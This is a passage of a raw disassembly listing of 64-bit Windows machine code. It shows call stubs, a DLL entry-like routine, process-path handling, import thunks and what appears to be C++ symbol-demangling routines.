   2dc493487:	00 
   2dc493488:	66 89 01             	mov    %ax,(%rcx)
   2dc49348b:	48 89 c8             	mov    %rcx,%rax
   2dc49348e:	48 89 e9             	mov    %rbp,%rcx
   2dc493491:	e9 cc fe ff ff       	jmp    0x2dc493362
   2dc493496:	4c 8d 44 12 02       	lea    0x2(%rdx,%rdx,1),%r8
   2dc49349b:	4c 89 f1             	mov    %r14,%rcx
   2dc49349e:	4c 89 e2             	mov    %r12,%rdx
   2dc4934a1:	e8 3a 19 01 00       	call   0x2dc4a4de0
   2dc4934a6:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   2dc4934aa:	e9 91 fb ff ff       	jmp    0x2dc493040
   2dc4934af:	4c 8d 44 09 02       	lea    0x2(%rcx,%rcx,1),%r8
   2dc4934b4:	48 89 f1             	mov    %rsi,%rcx
   2dc4934b7:	4c 89 8c 24 e0 00 00 	mov    %r9,0xe0(%rsp)
   2dc4934be:	00 
   2dc4934bf:	48 89 94 24 d8 00 00 	mov    %rdx,0xd8(%rsp)
   2dc4934c6:	00 
   2dc4934c7:	e8 14 19 01 00       	call   0x2dc4a4de0
   2dc4934cc:	4c 8b 8c 24 e0 00 00 	mov    0xe0(%rsp),%r9
   2dc4934d3:	00 
   2dc4934d4:	48 8b 94 24 d8 00 00 	mov    0xd8(%rsp),%rdx
   2dc4934db:	00 
   2dc4934dc:	49 8b 49 08          	mov    0x8(%r9),%rcx
   2dc4934e0:	e9 9a f8 ff ff       	jmp    0x2dc492d7f
   2dc4934e5:	4c 8d 44 09 02       	lea    0x2(%rcx,%rcx,1),%r8
   2dc4934ea:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   2dc4934f1:	00 
   2dc4934f2:	4c 89 8c 24 e8 00 00 	mov    %r9,0xe8(%rsp)
   2dc4934f9:	00 
   2dc4934fa:	48 89 94 24 e0 00 00 	mov    %rdx,0xe0(%rsp)
   2dc493501:	00 
   2dc493502:	e8 d9 18 01 00       	call   0x2dc4a4de0
   2dc493507:	4c 8b 8c 24 e8 00 00 	mov    0xe8(%rsp),%r9
   2dc49350e:	00 
   2dc49350f:	48 8b 94 24 e0 00 00 	mov    0xe0(%rsp),%rdx
   2dc493516:	00 
   2dc493517:	49 8b 49 08          	mov    0x8(%r9),%rcx
   2dc49351b:	e9 f6 f8 ff ff       	jmp    0x2dc492e16
   2dc493520:	4c 8d 44 09 02       	lea    0x2(%rcx,%rcx,1),%r8
   2dc493525:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   2dc49352a:	48 89 94 24 e0 00 00 	mov    %rdx,0xe0(%rsp)
   2dc493531:	00 
   2dc493532:	e8 a9 18 01 00       	call   0x2dc4a4de0
   2dc493537:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   2dc49353b:	48 8b 94 24 e0 00 00 	mov    0xe0(%rsp),%rdx
   2dc493542:	00 
   2dc493543:	e9 71 fa ff ff       	jmp    0x2dc492fb9
   2dc493548:	4c 8d 44 09 02       	lea    0x2(%rcx,%rcx,1),%r8
   2dc49354d:	48 8b 8c 24 a8 00 00 	mov    0xa8(%rsp),%rcx
   2dc493554:	00 
   2dc493555:	48 89 94 24 e0 00 00 	mov    %rdx,0xe0(%rsp)
   2dc49355c:	00 
   2dc49355d:	e8 7e 18 01 00       	call   0x2dc4a4de0
   2dc493562:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   2dc493566:	48 8b 94 24 e0 00 00 	mov    0xe0(%rsp),%rdx
   2dc49356d:	00 
   2dc49356e:	e9 bd f9 ff ff       	jmp    0x2dc492f30
   2dc493573:	4c 8d 44 09 02       	lea    0x2(%rcx,%rcx,1),%r8
   2dc493578:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   2dc49357f:	00 
   2dc493580:	4c 89 8c 24 e8 00 00 	mov    %r9,0xe8(%rsp)
   2dc493587:	00 
   2dc493588:	48 89 94 24 e0 00 00 	mov    %rdx,0xe0(%rsp)
   2dc49358f:	00 
   2dc493590:	e8 4b 18 01 00       	call   0x2dc4a4de0
   2dc493595:	4c 8b 8c 24 e8 00 00 	mov    0xe8(%rsp),%r9
   2dc49359c:	00 
   2dc49359d:	48 8b 94 24 e0 00 00 	mov    0xe0(%rsp),%rdx
   2dc4935a4:	00 
   2dc4935a5:	49 8b 49 08          	mov    0x8(%r9),%rcx
   2dc4935a9:	e9 f6 f8 ff ff       	jmp    0x2dc492ea4
   2dc4935ae:	48 8d 0d 0b 4b 02 00 	lea    0x24b0b(%rip),%rcx        # 0x2dc4b80c0
   2dc4935b5:	e8 f6 31 02 00       	call   0x2dc4b67b0
   2dc4935ba:	48 8d 0d ff 4a 02 00 	lea    0x24aff(%rip),%rcx        # 0x2dc4b80c0
   2dc4935c1:	e8 ea 31 02 00       	call   0x2dc4b67b0
   2dc4935c6:	48 8d 0d f3 4a 02 00 	lea    0x24af3(%rip),%rcx        # 0x2dc4b80c0
   2dc4935cd:	e8 de 31 02 00       	call   0x2dc4b67b0
   2dc4935d2:	48 8d 0d e7 4a 02 00 	lea    0x24ae7(%rip),%rcx        # 0x2dc4b80c0
   2dc4935d9:	e8 d2 31 02 00       	call   0x2dc4b67b0
   2dc4935de:	48 8d 0d db 4a 02 00 	lea    0x24adb(%rip),%rcx        # 0x2dc4b80c0
   2dc4935e5:	e8 c6 31 02 00       	call   0x2dc4b67b0
   2dc4935ea:	48 8d 0d cf 4a 02 00 	lea    0x24acf(%rip),%rcx        # 0x2dc4b80c0
   2dc4935f1:	e8 ba 31 02 00       	call   0x2dc4b67b0
   2dc4935f6:	48 8d 0d c3 4a 02 00 	lea    0x24ac3(%rip),%rcx        # 0x2dc4b80c0
   2dc4935fd:	e8 ae 31 02 00       	call   0x2dc4b67b0
   2dc493602:	48 8d 0d b7 4a 02 00 	lea    0x24ab7(%rip),%rcx        # 0x2dc4b80c0
   2dc493609:	e8 a2 31 02 00       	call   0x2dc4b67b0
   2dc49360e:	48 8d 0d ab 4a 02 00 	lea    0x24aab(%rip),%rcx        # 0x2dc4b80c0
   2dc493615:	e8 96 31 02 00       	call   0x2dc4b67b0
   2dc49361a:	48 8d 0d 9f 4a 02 00 	lea    0x24a9f(%rip),%rcx        # 0x2dc4b80c0
   2dc493621:	e8 8a 31 02 00       	call   0x2dc4b67b0
   2dc493626:	48 8d 0d 93 4a 02 00 	lea    0x24a93(%rip),%rcx        # 0x2dc4b80c0
   2dc49362d:	e8 7e 31 02 00       	call   0x2dc4b67b0
   2dc493632:	48 8d 0d 87 4a 02 00 	lea    0x24a87(%rip),%rcx        # 0x2dc4b80c0
   2dc493639:	e8 72 31 02 00       	call   0x2dc4b67b0
   2dc49363e:	48 8d 0d 7b 4a 02 00 	lea    0x24a7b(%rip),%rcx        # 0x2dc4b80c0
   2dc493645:	e8 66 31 02 00       	call   0x2dc4b67b0
   2dc49364a:	48 8d 0d 6f 4a 02 00 	lea    0x24a6f(%rip),%rcx        # 0x2dc4b80c0
   2dc493651:	e8 5a 31 02 00       	call   0x2dc4b67b0
   2dc493656:	48 8d 0d 63 4a 02 00 	lea    0x24a63(%rip),%rcx        # 0x2dc4b80c0
   2dc49365d:	e8 4e 31 02 00       	call   0x2dc4b67b0
   2dc493662:	48 8d 0d 57 4a 02 00 	lea    0x24a57(%rip),%rcx        # 0x2dc4b80c0
   2dc493669:	e8 42 31 02 00       	call   0x2dc4b67b0
   2dc49366e:	48 8d 0d 4b 4a 02 00 	lea    0x24a4b(%rip),%rcx        # 0x2dc4b80c0
   2dc493675:	e8 36 31 02 00       	call   0x2dc4b67b0
   2dc49367a:	48 8d 0d 3f 4a 02 00 	lea    0x24a3f(%rip),%rcx        # 0x2dc4b80c0
   2dc493681:	e8 2a 31 02 00       	call   0x2dc4b67b0
   2dc493686:	48 89 c3             	mov    %rax,%rbx
   2dc493689:	e9 04 2b 02 00       	jmp    0x2dc4b6192
   2dc49368e:	48 89 c3             	mov    %rax,%rbx
   2dc493691:	e9 13 2b 02 00       	jmp    0x2dc4b61a9
   2dc493696:	48 89 c3             	mov    %rax,%rbx
   2dc493699:	e9 8f 2b 02 00       	jmp    0x2dc4b622d
   2dc49369e:	48 89 c3             	mov    %rax,%rbx
   2dc4936a1:	e9 10 2b 02 00       	jmp    0x2dc4b61b6
   2dc4936a6:	48 89 c3             	mov    %rax,%rbx
   2dc4936a9:	e9 87 2b 02 00       	jmp    0x2dc4b6235
   2dc4936ae:	48 89 c3             	mov    %rax,%rbx
   2dc4936b1:	e9 0d 2b 02 00       	jmp    0x2dc4b61c3
   2dc4936b6:	48 89 c3             	mov    %rax,%rbx
   2dc4936b9:	e9 de 2a 02 00       	jmp    0x2dc4b619c
   2dc4936be:	48 89 c3             	mov    %rax,%rbx
   2dc4936c1:	e9 a5 2b 02 00       	jmp    0x2dc4b626b
   2dc4936c6:	48 89 c3             	mov    %rax,%rbx
   2dc4936c9:	e9 02 2b 02 00       	jmp    0x2dc4b61d0
   2dc4936ce:	48 89 c3             	mov    %rax,%rbx
   2dc4936d1:	e9 69 2b 02 00       	jmp    0x2dc4b623f
   2dc4936d6:	48 89 c3             	mov    %rax,%rbx
   2dc4936d9:	e9 07 2b 02 00       	jmp    0x2dc4b61e5
   2dc4936de:	48 89 c3             	mov    %rax,%rbx
   2dc4936e1:	e9 a6 2b 02 00       	jmp    0x2dc4b628c
   2dc4936e6:	48 89 c3             	mov    %rax,%rbx
   2dc4936e9:	e9 94 2b 02 00       	jmp    0x2dc4b6282
   2dc4936ee:	e9 ab 2b 02 00       	jmp    0x2dc4b629e
   2dc4936f3:	48 89 c3             	mov    %rax,%rbx
   2dc4936f6:	e9 51 2b 02 00       	jmp    0x2dc4b624c
   2dc4936fb:	48 89 c3             	mov    %rax,%rbx
   2dc4936fe:	e9 18 2b 02 00       	jmp    0x2dc4b621b
   2dc493703:	48 89 c3             	mov    %rax,%rbx
   2dc493706:	e9 1a 2b 02 00       	jmp    0x2dc4b6225
   2dc49370b:	48 89 c3             	mov    %rax,%rbx
   2dc49370e:	e9 ad 2b 02 00       	jmp    0x2dc4b62c0
   2dc493713:	48 89 c3             	mov    %rax,%rbx
   2dc493716:	e9 31 2b 02 00       	jmp    0x2dc4b624c
   2dc49371b:	48 89 c3             	mov    %rax,%rbx
   2dc49371e:	e9 8b 2b 02 00       	jmp    0x2dc4b62ae
   2dc493723:	48 89 c3             	mov    %rax,%rbx
   2dc493726:	e9 9f 2b 02 00       	jmp    0x2dc4b62ca
   2dc49372b:	48 89 c3             	mov    %rax,%rbx
   2dc49372e:	e9 cc 2a 02 00       	jmp    0x2dc4b61ff
   2dc493733:	48 89 c3             	mov    %rax,%rbx
   2dc493736:	e9 9c 2b 02 00       	jmp    0x2dc4b62d7
   2dc49373b:	48 89 c3             	mov    %rax,%rbx
   2dc49373e:	e9 af 2a 02 00       	jmp    0x2dc4b61f2
   2dc493743:	48 89 c3             	mov    %rax,%rbx
   2dc493746:	e9 be 2a 02 00       	jmp    0x2dc4b6209
   2dc49374b:	48 89 c3             	mov    %rax,%rbx
   2dc49374e:	e9 25 2b 02 00       	jmp    0x2dc4b6278
   2dc493753:	48 89 c3             	mov    %rax,%rbx
   2dc493756:	e9 8b 2b 02 00       	jmp    0x2dc4b62e6
   2dc49375b:	48 89 c3             	mov    %rax,%rbx
   2dc49375e:	e9 43 2b 02 00       	jmp    0x2dc4b62a6
   2dc493763:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   2dc49376a:	00 00 00 00 
   2dc49376e:	66 90                	xchg   %ax,%ax
   2dc493770:	57                   	push   %rdi
   2dc493771:	53                   	push   %rbx
   2dc493772:	48 81 ec a8 02 00 00 	sub    $0x2a8,%rsp
   2dc493779:	e8 22 de ff ff       	call   0x2dc4915a0
   2dc49377e:	89 c2                	mov    %eax,%edx
   2dc493780:	b8 01 00 00 00       	mov    $0x1,%eax
   2dc493785:	84 d2                	test   %dl,%dl
   2dc493787:	74 0f                	je     0x2dc493798
   2dc493789:	48 81 c4 a8 02 00 00 	add    $0x2a8,%rsp
   2dc493790:	5b                   	pop    %rbx
   2dc493791:	5f                   	pop    %rdi
   2dc493792:	c3                   	ret
   2dc493793:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   2dc493798:	48 8d 9c 24 90 00 00 	lea    0x90(%rsp),%rbx
   2dc49379f:	00 
   2dc4937a0:	31 c9                	xor    %ecx,%ecx
   2dc4937a2:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   2dc4937a8:	48 89 da             	mov    %rbx,%rdx
   2dc4937ab:	48 8d 7c 24 28       	lea    0x28(%rsp),%rdi
   2dc4937b0:	ff 15 92 2d 03 00    	call   *0x32d92(%rip)        # 0x2dc4c6548
   2dc4937b6:	31 c0                	xor    %eax,%eax
   2dc4937b8:	b9 0d 00 00 00       	mov    $0xd,%ecx
   2dc4937bd:	66 48 0f 6e cb       	movq   %rbx,%xmm1
   2dc4937c2:	f3 48 ab             	rep stos %rax,(%rdi)
   2dc4937c5:	48 8b 05 3c 4a 02 00 	mov    0x24a3c(%rip),%rax        # 0x2dc4b8208
   2dc4937cc:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
   2dc4937d3:	00 
   2dc4937d4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   2dc4937d9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   2dc4937de:	48 8d 05 cf 48 02 00 	lea    0x248cf(%rip),%rax        # 0x2dc4b80b4
   2dc4937e5:	66 48 0f 6e c0       	movq   %rax,%xmm0
   2dc4937ea:	66 0f 6c c1          	punpcklqdq %xmm1,%xmm0
   2dc4937ee:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   2dc4937f3:	ff 15 47 30 03 00    	call   *0x33047(%rip)        # 0x2dc4c6840
   2dc4937f9:	85 c0                	test   %eax,%eax
   2dc4937fb:	74 8c                	je     0x2dc493789
   2dc4937fd:	31 c9                	xor    %ecx,%ecx
   2dc4937ff:	ff 15 13 2d 03 00    	call   *0x32d13(%rip)        # 0x2dc4c6518
   2dc493805:	90                   	nop
   2dc493806:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   2dc49380d:	00 00 00 
   2dc493810:	53                   	push   %rbx
   2dc493811:	48 83 ec 20          	sub    $0x20,%rsp
   2dc493815:	83 fa 01             	cmp    $0x1,%edx
   2dc493818:	74 0e                	je     0x2dc493828
   2dc49381a:	b8 01 00 00 00       	mov    $0x1,%eax
   2dc49381f:	48 83 c4 20          	add    $0x20,%rsp
   2dc493823:	5b                   	pop    %rbx
   2dc493824:	c3                   	ret
   2dc493825:	0f 1f 00             	nopl   (%rax)
   2dc493828:	48 8d 1d 71 08 03 00 	lea    0x30871(%rip),%rbx        # 0x2dc4c40a0
   2dc49382f:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   2dc493834:	ff 15 ce 2c 03 00    	call   *0x32cce(%rip)        # 0x2dc4c6508
   2dc49383a:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   2dc49383f:	48 89 da             	mov    %rbx,%rdx
   2dc493842:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   2dc493848:	ff 15 fa 2c 03 00    	call   *0x32cfa(%rip)        # 0x2dc4c6548
   2dc49384e:	ba 5c 00 00 00       	mov    $0x5c,%edx
   2dc493853:	48 89 d9             	mov    %rbx,%rcx
   2dc493856:	e8 9d 15 01 00       	call   0x2dc4a4df8
   2dc49385b:	48 85 c0             	test   %rax,%rax
   2dc49385e:	74 ba                	je     0x2dc49381a
   2dc493860:	31 d2                	xor    %edx,%edx
   2dc493862:	66 89 10             	mov    %dx,(%rax)
   2dc493865:	b8 01 00 00 00       	mov    $0x1,%eax
   2dc49386a:	48 83 c4 20          	add    $0x20,%rsp
   2dc49386e:	5b                   	pop    %rbx
   2dc49386f:	c3                   	ret
   2dc493870:	ff 25 ca 2f 03 00    	jmp    *0x32fca(%rip)        # 0x2dc4c6840
   2dc493876:	90                   	nop
   2dc493877:	90                   	nop
   2dc493878:	ff 25 ba 2f 03 00    	jmp    *0x32fba(%rip)        # 0x2dc4c6838
   2dc49387e:	90                   	nop
   2dc49387f:	90                   	nop
   2dc493880:	ff 25 aa 2f 03 00    	jmp    *0x32faa(%rip)        # 0x2dc4c6830
   2dc493886:	90                   	nop
   2dc493887:	90                   	nop
   2dc493888:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   2dc49388f:	00 
   2dc493890:	49 89 ca             	mov    %rcx,%r10
   2dc493893:	83 fa 31             	cmp    $0x31,%edx
   2dc493896:	0f 87 94 00 00 00    	ja     0x2dc493930
   2dc49389c:	83 fa 28             	cmp    $0x28,%edx
   2dc49389f:	76 1f                	jbe    0x2dc4938c0
   2dc4938a1:	8d 42 d7             	lea    -0x29(%rdx),%eax
   2dc4938a4:	83 f8 08             	cmp    $0x8,%eax
   2dc4938a7:	0f 87 ab 00 00 00    	ja     0x2dc493958
   2dc4938ad:	48 8d 0d 8c 4c 02 00 	lea    0x24c8c(%rip),%rcx        # 0x2dc4b8540
   2dc4938b4:	48 63 04 81          	movslq (%rcx,%rax,4),%rax
   2dc4938b8:	48 01 c8             	add    %rcx,%rax
   2dc4938bb:	ff e0                	jmp    *%rax
   2dc4938bd:	0f 1f 00             	nopl   (%rax)
   2dc4938c0:	89 d1                	mov    %edx,%ecx
   2dc4938c2:	b8 01 00 00 00       	mov    $0x1,%eax
   2dc4938c7:	48 d3 e0             	shl    %cl,%rax
   2dc4938ca:	48 b9 00 f6 ff 00 7c 	movabs $0x17c00fff600,%rcx
   2dc4938d1:	01 00 00 
   2dc4938d4:	48 85 c8             	test   %rcx,%rax
   2dc4938d7:	75 73                	jne    0x2dc49394c
   2dc4938d9:	48 b9 00 00 00 fe 01 	movabs $0x1fe000000,%rcx
   2dc4938e0:	00 00 00 
   2dc4938e3:	48 85 c8             	test   %rcx,%rax
   2dc4938e6:	75 16                	jne    0x2dc4938fe
   2dc4938e8:	48 81 c1 1e 08 00 02 	add    $0x200081e,%rcx
   2dc4938ef:	48 85 c8             	test   %rcx,%rax
   2dc4938f2:	74 64                	je     0x2dc493958
   2dc4938f4:	4d 85 c0             	test   %r8,%r8
   2dc4938f7:	74 5f                	je     0x2dc493958
   2dc4938f9:	4d 85 c9             	test   %r9,%r9
   2dc4938fc:	74 5a                	je     0x2dc493958
   2dc4938fe:	41 8b 4a 28          	mov    0x28(%r10),%ecx
   2dc493902:	41 3b 4a 2c          	cmp    0x2c(%r10),%ecx
   2dc493906:	7d 50                	jge    0x2dc493958
   2dc493908:	48 63 c1             	movslq %ecx,%rax
   2dc49390b:	83 c1 01             	add    $0x1,%ecx
   2dc49390e:	48 c1 e0 05          	shl    $0x5,%rax
   2dc493912:	49 03 42 20          	add    0x20(%r10),%rax
   2dc493916:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   2dc49391d:	00 
   2dc49391e:	41 89 4a 28          	mov    %ecx,0x28(%r10)
   2dc493922:	89 10                	mov    %edx,(%rax)
   2dc493924:	4c 89 40 10          	mov    %r8,0x10(%rax)
   2dc493928:	4c 89 48 18          	mov    %r9,0x18(%rax)
   2dc49392c:	c3                   	ret
   2dc49392d:	0f 1f 00             	nopl   (%rax)
   2dc493930:	83 fa 4f             	cmp    $0x4f,%edx
   2dc493933:	77 2b                	ja     0x2dc493960
   2dc493935:	83 fa 33             	cmp    $0x33,%edx
   2dc493938:	76 1e                	jbe    0x2dc493958
   2dc49393a:	8d 4a cc             	lea    -0x34(%rdx),%ecx
   2dc49393d:	b8 01 00 00 00       	mov    $0x1,%eax
   2dc493942:	48 d3 e0             	shl    %cl,%rax
   2dc493945:	a9 07 11 c7 01       	test   $0x1c71107,%eax
   2dc49394a:	74 34                	je     0x2dc493980
   2dc49394c:	4d 85 c0             	test   %r8,%r8
   2dc49394f:	75 ad                	jne    0x2dc4938fe
   2dc493951:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc493958:	31 c0                	xor    %eax,%eax
   2dc49395a:	c3                   	ret
   2dc49395b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   2dc493960:	8d 42 ae             	lea    -0x52(%rdx),%eax
   2dc493963:	83 f8 09             	cmp    $0x9,%eax
   2dc493966:	77 96                	ja     0x2dc4938fe
   2dc493968:	48 8d 0d f5 4b 02 00 	lea    0x24bf5(%rip),%rcx        # 0x2dc4b8564
   2dc49396f:	48 63 04 81          	movslq (%rcx,%rax,4),%rax
   2dc493973:	48 01 c8             	add    %rcx,%rax
   2dc493976:	ff e0                	jmp    *%rax
   2dc493978:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   2dc49397f:	00 
   2dc493980:	a9 f8 2e 00 0a       	test   $0xa002ef8,%eax
   2dc493985:	0f 85 69 ff ff ff    	jne    0x2dc4938f4
   2dc49398b:	83 fa 4e             	cmp    $0x4e,%edx
   2dc49398e:	0f 84 6a ff ff ff    	je     0x2dc4938fe
   2dc493994:	31 c0                	xor    %eax,%eax
   2dc493996:	eb c2                	jmp    0x2dc49395a
   2dc493998:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   2dc49399f:	00 
   2dc4939a0:	44 8b 49 28          	mov    0x28(%rcx),%r9d
   2dc4939a4:	44 3b 49 2c          	cmp    0x2c(%rcx),%r9d
   2dc4939a8:	7d 46                	jge    0x2dc4939f0
   2dc4939aa:	49 63 c1             	movslq %r9d,%rax
   2dc4939ad:	41 83 c1 01          	add    $0x1,%r9d
   2dc4939b1:	48 c1 e0 05          	shl    $0x5,%rax
   2dc4939b5:	48 03 41 20          	add    0x20(%rcx),%rax
   2dc4939b9:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   2dc4939c0:	00 
   2dc4939c1:	44 89 49 28          	mov    %r9d,0x28(%rcx)
   2dc4939c5:	48 85 d2             	test   %rdx,%rdx
   2dc4939c8:	74 26                	je     0x2dc4939f0
   2dc4939ca:	45 85 c0             	test   %r8d,%r8d
   2dc4939cd:	7e 21                	jle    0x2dc4939f0
   2dc4939cf:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   2dc4939d6:	00 
   2dc4939d7:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   2dc4939dd:	48 89 50 10          	mov    %rdx,0x10(%rax)
   2dc4939e1:	44 89 40 18          	mov    %r8d,0x18(%rax)
   2dc4939e5:	c3                   	ret
   2dc4939e6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   2dc4939ed:	00 00 00 
   2dc4939f0:	31 c0                	xor    %eax,%eax
   2dc4939f2:	c3                   	ret
   2dc4939f3:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   2dc4939fa:	00 00 00 00 
   2dc4939fe:	66 90                	xchg   %ax,%ax
   2dc493a00:	53                   	push   %rbx
   2dc493a01:	49 89 c9             	mov    %rcx,%r9
   2dc493a04:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   2dc493a08:	0f b6 01             	movzbl (%rcx),%eax
   2dc493a0b:	3c 6e                	cmp    $0x6e,%al
   2dc493a0d:	0f 84 7d 00 00 00    	je     0x2dc493a90
   2dc493a13:	8d 50 d0             	lea    -0x30(%rax),%edx
   2dc493a16:	80 fa 09             	cmp    $0x9,%dl
   2dc493a19:	0f 87 93 00 00 00    	ja     0x2dc493ab2
   2dc493a1f:	45 31 d2             	xor    %r10d,%r10d
   2dc493a22:	83 e8 30             	sub    $0x30,%eax
   2dc493a25:	48 83 c1 01          	add    $0x1,%rcx
   2dc493a29:	45 31 c0             	xor    %r8d,%r8d
   2dc493a2c:	bb ff ff ff 7f       	mov    $0x7fffffff,%ebx
   2dc493a31:	0f be c0             	movsbl %al,%eax
   2dc493a34:	41 bb cd cc cc cc    	mov    $0xcccccccd,%r11d
   2dc493a3a:	eb 1c                	jmp    0x2dc493a58
   2dc493a3c:	0f 1f 40 00          	nopl   0x0(%rax)
   2dc493a40:	83 e8 30             	sub    $0x30,%eax
   2dc493a43:	89 da                	mov    %ebx,%edx
   2dc493a45:	48 83 c1 01          	add    $0x1,%rcx
   2dc493a49:	29 c2                	sub    %eax,%edx
   2dc493a4b:	49 0f af d3          	imul   %r11,%rdx
   2dc493a4f:	48 c1 ea 23          	shr    $0x23,%rdx
   2dc493a53:	44 39 c2             	cmp    %r8d,%edx
   2dc493a56:	7c 28                	jl     0x2dc493a80
   2dc493a58:	43 8d 14 80          	lea    (%r8,%r8,4),%edx
   2dc493a5c:	49 89 49 18          	mov    %rcx,0x18(%r9)
   2dc493a60:	44 8d 04 50          	lea    (%rax,%rdx,2),%r8d
   2dc493a64:	0f be 01             	movsbl (%rcx),%eax
   2dc493a67:	8d 50 d0             	lea    -0x30(%rax),%edx
   2dc493a6a:	80 fa 09             	cmp    $0x9,%dl
   2dc493a6d:	76 d1                	jbe    0x2dc493a40
   2dc493a6f:	44 89 c0             	mov    %r8d,%eax
   2dc493a72:	f7 d8                	neg    %eax
   2dc493a74:	45 85 d2             	test   %r10d,%r10d
   2dc493a77:	44 0f 45 c0          	cmovne %eax,%r8d
   2dc493a7b:	44 89 c0             	mov    %r8d,%eax
   2dc493a7e:	5b                   	pop    %rbx
   2dc493a7f:	c3                   	ret
   2dc493a80:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
   2dc493a86:	44 89 c0             	mov    %r8d,%eax
   2dc493a89:	5b                   	pop    %rbx
   2dc493a8a:	c3                   	ret
   2dc493a8b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   2dc493a90:	48 8d 51 01          	lea    0x1(%rcx),%rdx
   2dc493a94:	49 89 51 18          	mov    %rdx,0x18(%r9)
   2dc493a98:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   2dc493a9c:	8d 48 d0             	lea    -0x30(%rax),%ecx
   2dc493a9f:	80 f9 09             	cmp    $0x9,%cl
   2dc493aa2:	77 0e                	ja     0x2dc493ab2
   2dc493aa4:	48 89 d1             	mov    %rdx,%rcx
   2dc493aa7:	41 ba 01 00 00 00    	mov    $0x1,%r10d
   2dc493aad:	e9 70 ff ff ff       	jmp    0x2dc493a22
   2dc493ab2:	45 31 c0             	xor    %r8d,%r8d
   2dc493ab5:	eb c4                	jmp    0x2dc493a7b
   2dc493ab7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   2dc493abe:	00 00 
   2dc493ac0:	53                   	push   %rbx
   2dc493ac1:	48 83 ec 20          	sub    $0x20,%rsp
   2dc493ac5:	48 89 cb             	mov    %rcx,%rbx
   2dc493ac8:	85 d2                	test   %edx,%edx
   2dc493aca:	75 1f                	jne    0x2dc493aeb
   2dc493acc:	48 8b 41 18          	mov    0x18(%rcx),%rax
   2dc493ad0:	80 38 00             	cmpb   $0x0,(%rax)
   2dc493ad3:	75 0b                	jne    0x2dc493ae0
   2dc493ad5:	31 c0                	xor    %eax,%eax
   2dc493ad7:	48 83 c4 20          	add    $0x20,%rsp
   2dc493adb:	5b                   	pop    %rbx
   2dc493adc:	c3                   	ret
   2dc493add:	0f 1f 00             	nopl   (%rax)
   2dc493ae0:	48 8d 50 01          	lea    0x1(%rax),%rdx
   2dc493ae4:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   2dc493ae8:	0f be 10             	movsbl (%rax),%edx
   2dc493aeb:	83 fa 68             	cmp    $0x68,%edx
   2dc493aee:	74 1e                	je     0x2dc493b0e
   2dc493af0:	83 fa 76             	cmp    $0x76,%edx
   2dc493af3:	75 e0                	jne    0x2dc493ad5
   2dc493af5:	48 89 d9             	mov    %rbx,%rcx
   2dc493af8:	e8 03 ff ff ff       	call   0x2dc493a00
   2dc493afd:	48 8b 43 18          	mov    0x18(%rbx),%rax
   2dc493b01:	80 38 5f             	cmpb   $0x5f,(%rax)
   2dc493b04:	75 cf                	jne    0x2dc493ad5
   2dc493b06:	48 83 c0 01          	add    $0x1,%rax
   2dc493b0a:	48 89 43 18          	mov    %rax,0x18(%rbx)
   2dc493b0e:	48 89 d9             	mov    %rbx,%rcx
   2dc493b11:	e8 ea fe ff ff       	call   0x2dc493a00
   2dc493b16:	48 8b 43 18          	mov    0x18(%rbx),%rax
   2dc493b1a:	80 38 5f             	cmpb   $0x5f,(%rax)
   2dc493b1d:	75 b6                	jne    0x2dc493ad5
   2dc493b1f:	48 83 c0 01          	add    $0x1,%rax
   2dc493b23:	48 89 43 18          	mov    %rax,0x18(%rbx)
   2dc493b27:	b8 01 00 00 00       	mov    $0x1,%eax
   2dc493b2c:	48 83 c4 20          	add    $0x20,%rsp
   2dc493b30:	5b                   	pop    %rbx
   2dc493b31:	c3                   	ret
   2dc493b32:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   2dc493b39:	00 00 00 00 
   2dc493b3d:	0f 1f 00             	nopl   (%rax)
   2dc493b40:	48 8b 41 18          	mov    0x18(%rcx),%rax
   2dc493b44:	49 89 d0             	mov    %rdx,%r8
   2dc493b47:	0f b6 10             	movzbl (%rax),%edx
   2dc493b4a:	80 fa 52             	cmp    $0x52,%dl
   2dc493b4d:	74 11                	je     0x2dc493b60
   2dc493b4f:	80 fa 4f             	cmp    $0x4f,%dl
   2dc493b52:	74 0c                	je     0x2dc493b60
   2dc493b54:	4c 89 c0             	mov    %r8,%rax
   2dc493b57:	c3                   	ret
   2dc493b58:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   2dc493b5f:	00 
   2dc493b60:	44 8b 59 48          	mov    0x48(%rcx),%r11d
   2dc493b64:	41 ba 20 00 00 00    	mov    $0x20,%r10d
